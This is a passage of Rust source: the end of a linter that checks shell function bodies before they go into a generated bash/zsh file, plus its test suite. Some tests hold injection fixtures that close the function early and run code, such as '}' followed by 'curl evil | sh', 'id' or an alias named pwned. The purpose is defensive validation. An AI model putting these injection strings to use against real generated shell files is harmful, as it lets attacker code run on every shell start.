            Some(&open) if open == want => {
                // An `if` branch and a loop body have to hold a command;
                // `case x in a) ;; esac` is the one empty list both shells
                // read, so `esac` is left out.
                if matches!(want, Ctx::If | Ctx::Do) {
                    self.ensure_list_filled(&format!("the list '{word}' closes"))?;
                }
                self.stack.pop();
                self.case_pattern = false;
                self.cmd_pos = false;
                self.command_arrived();
                Ok(())
            }
            Some(open) => Err(format!(
                "'{word}' arrives while {} is still open",
                open.describe()
            )),
            None => Err(format!("'{word}' has no matching '{opener}'")),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn refused(body: &str) -> String {
        body_problem(body).unwrap_or_else(|| panic!("expected {body:?} to be refused"))
    }

    fn accept(body: &str) {
        assert_eq!(body_problem(body), None, "expected {body:?} to be accepted");
        for shell in Shell::all() {
            assert_eq!(
                body_problem_in(body, shell),
                None,
                "expected {body:?} to be accepted for {}",
                shell.as_str()
            );
        }
    }

    #[test]
    fn a_standalone_close_brace_escapes_the_function() {
        // The bug this lint exists for: everything after the '}' would be
        // top-level code in the generated file, run on source and on every cd.
        for body in [
            "}\necho pwned",
            "echo hi\n}\ncurl evil | sh",
            "echo hi; }\nid",
            "}",
        ] {
            assert!(
                refused(body).contains("closes the function early"),
                "expected {body:?} to be refused as an escape"
            );
        }
    }

    #[test]
    fn a_close_brace_used_as_an_argument_is_refused_as_unbalanced() {
        // The shell would take it as an argument only because the word before
        // it is a command; one edit away it is an escape, so it must be quoted.
        assert!(refused("echo }").contains("closes the function early"));
        accept("echo '}'");
        accept("echo \"}\"");
        accept("echo \\}");
    }

    #[test]
    fn an_unterminated_construct_is_refused() {
        for (body, expected) in [
            ("{ echo hi", "'{' group is never closed"),
            ("echo 'oops", "single quote is never closed"),
            ("echo \"oops", "double quote is never closed"),
            ("echo $(date", "'$(' substitution is never closed"),
            ("echo `date", "'`' substitution is never closed"),
            ("echo ${x", "'${' expansion is never closed"),
            ("echo $((1 + 2", "arithmetic '((' is never closed"),
            ("if true; then echo hi", "'if' is never closed"),
            ("for f in *; do echo $f", "'do' is never closed"),
            ("case $x in a) echo hi ;;", "'case' is never closed"),
            ("cat <<EOF\nhi", "heredoc is never closed"),
            ("cat <<EOF", "heredoc is never closed"),
            ("( echo hi", "'(' is never closed"),
            (
                "cat <<\"EOF",
                "quote in a heredoc delimiter is never closed",
            ),
            ("echo a; {", "'{' group is never closed"),
        ] {
            let problem = refused(body);
            assert!(
                problem.contains(expected),
                "expected {body:?} to report {expected:?}, got {problem:?}"
            );
        }
    }

    #[test]
    fn a_trailing_backslash_would_escape_the_closing_brace() {
        assert!(refused("echo hi\\").contains("ends with a backslash"));
        accept("echo hi \\\n  there");
    }

    #[test]
    fn the_body_is_linted_as_the_generated_file_would_carry_it() {
        // `render_entry` writes the body's lines, so a trailing newline and any
        // carriage returns never reach the shell. Scanning the raw string would
        // read a body-final backslash as escaping its own newline, and would let
        // a '}' through because a '\r' sat between it and the line end.
        assert!(refused("echo hi \\\n").contains("ends with a backslash"));
        assert!(refused("}\r\nalias pwned='echo PWNED'").contains("closes the function early"));
        accept("echo hi\n");
    }

    #[test]
    fn a_close_with_nothing_to_close_is_refused() {
        assert!(refused("echo hi; fi").contains("'fi' has no matching 'if'"));
        assert!(refused("echo hi; done").contains("'done' has no matching 'do'"));
        assert!(refused("echo hi; esac").contains("'esac' has no matching 'case'"));
        assert!(refused("echo hi )").contains("')' has no matching '('"));
    }

    #[test]
    fn a_crossed_close_is_refused() {
        assert!(refused("if true; then { echo hi; fi").contains("'{' group is still open"));
        assert!(refused("{ if true; then echo hi; }").contains("'if' is still open"));
        assert!(refused("echo $(fi)").contains("'$(' substitution is still open"));
        assert!(refused("echo `done`").contains("'`' substitution is still open"));
        assert!(refused("(( esac ))").contains("arithmetic '((' is still open"));
        assert!(refused("(fi)").contains("'(' group is still open"));
        assert!(refused("case $1 in a) fi ;; esac").contains("a 'case' is still open"));
        assert!(refused("for f in *; do fi; done").contains("a 'do' is still open"));
    }

    #[test]
    fn a_definition_the_shell_would_not_read_as_one_is_refused() {
        // zsh takes no blank inside the parentheses of the bare-name form, so
        // reading `foo ( )` as a definition would hand the `}` after it a
        // phantom group and let it close the generated definition early.
        assert!(refused("foo ( ) { echo hi; }").contains("closes the function early"));
        assert!(refused("foo (\t) { echo hi; }").contains("closes the function early"));
        accept("foo() { echo hi; }\nfoo");
        accept("foo () { echo hi; }\nfoo");
    }

    #[test]
    fn a_case_branch_terminator_needs_a_branch_to_end() {
        // Still being in pattern position means no `)` has opened a branch, so
        // there is nothing here for the terminator to close.
        for body in ["case $1 in ;; esac", "case $1 in a) echo a ;; ;; esac"] {
            assert!(
                refused(body).contains("has no 'case' branch to end"),
                "expected {body:?} to be refused for having no branch"
            );
        }
    }

    #[test]
    fn ordinary_bodies_are_accepted() {
        for body in [
            "git status",
            "cd \"$1\" && ls -la",
            "[ -d .git ] && { git status; git log -1; }",
            "if [ -d x ]; then cd x; else mkdir x; fi",
            "for f in *.rs; do echo \"$f\"; done",
            "while read -r line; do echo \"$line\"; done < input",
            "case $1 in a|b) echo ab ;; *) echo other ;; esac",
            "case $1 in (a) echo a ;; esac",
            "inner() {\n  echo hi\n}\ninner",
            "outer() ( cd /tmp; ls )",
            "echo \"$(basename \"$1\")\"",
            "echo `date +%s`",
            "local n=${1:-5}\nprintf '%s\\n' \"$n\"",
            "echo \"${1:- # default}\"",
            "((echo hi) | cat)",
            "echo `case $1 in a) echo a ;; esac`",
            "echo a &&\n  echo b",
            "until [ -f done ]; do sleep 1; done",
            "select o in a b; do echo \"$o\"; break; done",
            "case $1 in a) ;; *) echo other ;; esac",
            "sleep 5 &\nwait",
            "git log | head -5",
            "time for i in 1; do :; done",
            "if { true; }; then echo a; fi",
            "if case $1 in a) true ;; esac; then echo a; fi",
            "while read -r a; do echo \"$a\"; done < <(echo x)",
            "echo ${x//\\}/]}",
            "x=$(cat <<'EOF'\n}\nEOF\n)\necho \"$x\"",
            "trap '}' EXIT",
            "cat <<E}F\nx\nE}F",
            "echo {a,${x}}",
            "case $1 in a) case $2 in b) echo b ;; esac ;; esac",
            "{\n  echo a\n  echo b\n} | cat",
            // The sections of a `for` header are allowed to be empty, and its
            // `))` is followed by the loop's `do` with or without a separator.
            "for ((;;)); do break; done",
            "for ((i = 0; i < 3; i++)) do echo $i; done",
            // A `case` with no branches, and a branch with no command, are the
            // empty lists both shells read.
            "case $1 in esac",
            "case $1 in a) ;; esac",
            "echo $()",
            // Only a `(` in command position holds commands, so an empty array
            // assignment and an empty process substitution operand stand.
            "args=()\nargs+=(x)\necho \"${args[@]}\"",
            "declare -A m=( )\necho ok",
            // A backslash and a backtick inside a double quote.
            "echo \"a\\\"b\"",
            "echo \"`date +%Y`\"",
            // A quoted heredoc delimiter written with a backslash.
            "cat <<\\XEOF\n}\nXEOF",
            // zsh accepts a blank inside the parentheses after `function`.
            "function inner ( ) {\n  echo hi\n}\ninner",
        ] {
            accept(body);
        }
    }

    #[test]
    fn a_body_that_balances_but_cannot_parse_is_refused() {
        // bash abandons the whole generated file on a syntax error, taking the
        // definitions after it and the scope dispatcher with it, so a balanced
        // body still has to be one the shell can read.
        for (body, expected) in [
            ("echo &&", "'&&' has no command after it"),
            ("echo ||", "'||' has no command after it"),
            ("echo |", "'|' has no command after it"),
            ("{ echo && }", "'&&' has no command after it"),
            // An empty group is not the command the operator is waiting for.
            ("echo a && { }", "'&&' has no command after it"),
            ("echo a && ( )", "'&&' has no command after it"),
            ("if x; then echo && fi", "'&&' has no command after it"),
            ("then echo hi", "'then' has no matching 'if'"),
            ("echo hi\nelse\necho bye", "'else' has no matching 'if'"),
            ("if x; then y; fi\nelif z", "'elif' has no matching 'if'"),
            ("echo a ;;", "';;' has no 'case' branch to end"),
            ("do echo hi; done", "'do' has no loop before it to open"),
            (
                "for f in *; echo \"$f\"",
                "'for' is never followed by a 'do'",
            ),
            ("while :; echo hi", "'while' is never followed by a 'do'"),
        ] {
            let problem = refused(body);
            assert!(
                problem.contains(expected),
                "{body:?} was refused as {problem:?}, wanted {expected:?}"
            );
        }
    }

    #[test]
    fn an_operator_with_no_command_before_it_is_refused() {
        // The mirror of the dangling-operator rule. bash abandons the generated
        // file on each of these, so a body that ends up here would take every
        // later definition and the scope dispatcher with it.
        for (body, expected) in [
            ("echo a && ; echo b", "a ';' has no command before it"),
            ("echo a | ; echo b", "a ';' has no command before it"),
            ("echo a; ; echo b", "a ';' has no command before it"),
            ("echo a &&& echo b", "a '&' has no command before it"),
            ("echo a || | echo b", "a '|' has no command before it"),
            ("| echo a", "a '|' has no command before it"),
            ("&& echo a", "a '&&' has no command before it"),
            // A newline ends the command before it, so the operator opening
            // the next line has nothing on its left either.
            ("echo a\n| grep x", "a '|' has no command before it"),
            ("echo a\n&& echo b", "a '&&' has no command before it"),
            ("echo a\n; echo b", "a ';' has no command before it"),
            (
                "cat <<EOF\nx\nEOF\n| grep y",
                "a '|' has no command before it",
            ),
            // Outside a `case` these are a branch terminator to zsh and
            // nothing at all to bash, so neither shell reads one.
            ("echo a ;& echo b", "a ';&' has no 'case' branch to end"),
            ("echo a ;| echo b", "a ';|' has no 'case' branch to end"),
        ] {
            let problem = refused(body);
            assert!(
                problem.contains(expected),
                "{body:?} was refused as {problem:?}, wanted {expected:?}"
            );
        }
    }

    #[test]
    fn a_list_that_closes_empty_is_refused() {
        // Each of these balances and each is a bash syntax error, which costs
        // the whole generated file rather than just the entry.
        for (body, expected) in [
            ("{ }", "a '{' group has no command in it"),
            ("( )", "a '(' group has no command in it"),
            ("if true; then fi", "the list 'fi' closes has no command"),
            (
                "if true; then echo a; else fi",
                "the list 'fi' closes has no command",
            ),
            (
                "while true; do done",
                "the list 'done' closes has no command",
            ),
            (
                "for f in *; do done",
                "the list 'done' closes has no command",
            ),
            (
                "if then echo x; fi",
                "the 'if' condition has no command in it",
            ),
            (
                "while do echo a; done",
                "the 'while' header has no command in it",
            ),
            // `Entry::validate` requires a command, but a comment is one as far
            // as it can see and an empty function body is a bash error.
            ("# just a note", "the body has no command in it"),
            ("!", "the body has no command in it"),
            ("echo a && !", "a '&&' has no command after it"),
        ] {
            let problem = refused(body);
            assert!(
                problem.contains(expected),
                "{body:?} was refused as {problem:?}, wanted {expected:?}"
            );
        }
    }

    #[test]
    fn a_zsh_only_pipe_is_judged_per_shell() {
        // `|&` is zsh's shorthand for `2>&1 |`; bash 3, the version macOS
        // ships, reads it as a pipe into a syntax error and drops the file.
        let body = "cat \"$1\" |& grep x";
        assert_eq!(body_problem_in(body, Shell::Zsh), None);
        assert!(
            body_problem_in(body, Shell::Bash).is_some_and(|p| p.contains("'|&' pipe")),
            "expected bash to refuse {body:?}"
        );
        // One shell still carries it, so it is stored rather than refused.
        assert_eq!(body_problem(body), None);
        // The portable spelling is carried by both.
        accept("cat \"$1\" 2>&1 | grep x");
    }

    #[test]
    fn an_open_brace_is_a_group_only_in_command_position() {
        // A '{' passed as an argument is an ordinary word. Counting it as a
        // group would give the '}' below something to balance against, and that
        // '}' is the one that closes the definition early.
        accept("echo {");
        accept("echo hi {");
        assert!(
            refused("echo {\n}\nalias pwned='echo PWNED'").contains("closes the function early")
        );
        for body in [
            "inner() {\n  echo hi\n}\ninner",
            "inner () {\n  echo hi\n}",
            "function inner {\n  echo hi\n}",
            "function inner() {\n  echo hi\n}",
            "cmd | { read -r x; echo \"$x\"; }",
        ] {
            accept(body);
        }
    }

    #[test]
    fn a_close_brace_that_ends_a_word_closes_the_group_in_zsh() {
        // zsh needs no separator before the '}', so a body ending a word with
        // one closes the definition there even though bash would not.
        for body in [
            "ls -l}\nalias pwned='echo PWNED'",
            "echo \"a\"}\nalias pwned='echo PWNED'",
            "echo $(date)}\nalias pwned='echo PWNED'",
            "echo x}\"a\"",
            "echo 2>}",
            // The word's own '{' is already spoken for by the '}' before it, so
            // the second one has nothing left to match and closes the function.
            "echo ${x}}\nalias pwned='echo PWNED'",
            "echo ${x:-d}}\nalias pwned='echo PWNED'",
            // A heredoc delimiter ends at a '}' that ends a word, so this is a
            // heredoc on EOF followed by an escaping '}'.
            "cat <<EOF}\nx\nEOF}",
        ] {
            assert!(
                body_problem(body).is_some(),
                "expected {body:?} to be refused"
            );
        }
        // zsh ends the group at the '}' and bash reads it as an argument to
        // `echo`, going on to swallow the generated closing '}' and everything
        // after it. Neither reading can be carried, so the body has to say which.
        assert!(refused("{ echo a }").contains("zsh closes the group here"));
        accept("{ echo a; }");
        accept("{ echo a\n}");
        // A word that opened its own brace keeps it: these are not groups.
        accept("ls *.{c,h}");
        accept("find . -name '*.tmp' -exec rm {} \\;");
        accept("mv notes.txt{,.bak}");
        accept("echo ${x}");
    }

    #[test]
    fn a_redirection_is_not_a_command_separator() {
        // The '&' of `2>&1` used to restore command position, which let the '{'
        // after it open a group the escaping '}' could balance against.
        for body in [
            "echo hi 2>& {\n}\nalias pwned='echo PWNED'",
            "echo hi >& {\n}\nalias pwned='echo PWNED'",
            "echo hi <& {\n}\nalias pwned='echo PWNED'",
        ] {
            assert!(
                body_problem(body).is_some(),
                "expected {body:?} to be refused"
            );
        }
        accept("git log 2>&1 | head");
        accept("echo hi >> \"$1\" 2>/dev/null");
    }

    #[test]
    fn an_escaped_blank_cannot_hide_an_escape_behind_a_comment() {
        // `a\ #` is one word, so the shell opens no comment there and the '}'
        // later on the line is live.
        assert!(
            refused("echo a\\ # ; }\nalias pwned='echo PWNED'")
                .contains("closes the function early")
        );
        accept("echo a\\ b # a real comment");
    }

    #[test]
    fn a_hash_after_a_close_paren_cannot_hide_an_escape() {
        // `$(date)#` is one word, so the shell reads no comment there and a '}'
        // later on the line is live.
        assert!(
            refused("echo $(date)# ; }\nalias pwned='echo PWNED'")
                .contains("closes the function early")
        );
        accept("echo $(date)#tag");
    }

    #[test]
    fn a_herestring_operand_is_not_a_heredoc_delimiter() {
        accept("grep -q x <<< \"$1\"");
        accept("read -r a b <<< \"$line\"");
        accept("cat <<EOF\nhi\nEOF");
    }

    #[test]
    fn a_case_pattern_named_after_a_reserved_word_is_still_a_pattern() {
        accept("case \"$1\" in\n  do) echo d ;;\n  done) echo n ;;\n  *) echo o ;;\nesac");
        accept("case $(uname) in Darwin) echo mac ;; *) echo other ;; esac");
        accept("case $1 in (esac) echo e ;; (*) echo o ;; esac");
        // A branch body is still a command position, so what it opens must close.
        assert!(
            refused("case $1 in a) if true; then echo hi ;; esac").contains("'if' is still open")
        );
        assert!(
            refused("case $1 in (a) if true; then echo hi ;; esac").contains("'if' is still open")
        );
    }

    #[test]
    fn a_case_fall_through_is_judged_per_shell() {
        // Every fall-through form is a syntax error in at least one shell, and a
        // syntax error costs the whole generated file, so the shell that cannot
        // read one does not get the entry.
        for op in [";&", ";|"] {
            let body = format!("case $1 in a) echo a {op} b) echo b ;; esac");
            assert_eq!(body_problem_in(&body, Shell::Zsh), None);
            assert!(
                body_problem_in(&body, Shell::Bash).is_some_and(|p| p.contains("bash does not")),
                "expected bash to refuse {body:?}"
            );
            // One shell still carries it, so it is stored rather than refused.
            assert_eq!(body_problem(&body), None);
        }
        // `;;&` needs bash 4, which zsh will not parse and which the bash macOS
        // ships is older than, so nothing can carry it.
        let both = "case $1 in a) echo a ;;& b) echo b ;; esac";
        for shell in Shell::all() {
            assert!(body_problem_in(both, shell).is_some());
        }
        assert!(refused(both).contains("';;&' case fall-through"));
        assert!(refused("case $1 in a) echo a ;;; esac").contains("has no meaning after a case"));
        // The portable terminator is carried by both.
        accept("case $1 in a) echo a ;; b) echo b ;; esac");
    }

    #[test]
    fn a_negated_command_stays_in_command_position() {
        accept("! command -v git > /dev/null");
        accept("if ! git diff --quiet; then echo dirty; fi");
        assert!(refused("! if true; then echo hi").contains("'if' is never closed"));
    }

    #[test]
    fn a_brace_inside_a_word_is_not_a_group() {
        for body in [
            "ls *.{c,h}",
            "find . -name '*.tmp' -exec rm {} \\;",
            "docker ps --format \"{{.Names}}\"",
            "awk '{print $1}' \"$1\"",
            "echo ${x}",
            "echo ${#x}",
            "echo ${x#prefix}",
        ] {
            accept(body);
        }
    }

    #[test]
    fn a_reserved_word_only_counts_in_command_position() {
        for body in ["echo fi", "echo done esac", "grep -w do \"$1\"", "x=done"] {
            accept(body);
        }
    }

    #[test]
    fn a_heredoc_body_is_text() {
        // The whole point: a '}' on its own line inside a heredoc is content,
        // not an escape, and must not be refused.
        accept("cat <<EOF\n}\nEOF");
        accept("cat <<'EOF'\n} $(id)\nEOF");
        accept("cat <<-EOF\n\t}\n\tEOF");
        accept("cat <<EOF > out\nhi\nEOF\necho done");
        accept("cat <<A <<B\nfirst\nA\nsecond\nB");
        accept("cat <<\"EOF\"\n}\nEOF");
        assert!(refused("cat << ;").contains("no delimiter word"));
    }

    #[test]
    fn a_shift_in_arithmetic_is_not_a_heredoc() {
        accept("echo $((1 << 2))");
        accept("(( x = 1 << 4 ))\necho $x");
        accept("for ((i = 0; i < 3; i++)); do echo $i; done");
        // A `for` puts the scan out of command position, but its `((` is still
        // arithmetic, so the shift inside is not a heredoc.
        accept("for ((i = 1 << 4; i > 0; i >>= 1)); do echo $i; done");
        accept("while (( n < 5 )); do (( n++ )); done");
    }

    #[test]
    fn a_comment_hides_its_line() {
        accept("# a } in a comment\nls");
        accept("ls # trailing } comment");
        accept("echo a#b");
        // A comment cannot hide an escape on a later line.
        assert!(refused("# note\n}\necho pwned").contains("closes the function early"));
    }

    #[test]
    fn a_multibyte_body_is_scanned_by_character() {
        accept("echo 'héllo wörld'");
        assert!(refused("echo héllo\n}\nid").contains("closes the function early"));
    }
}
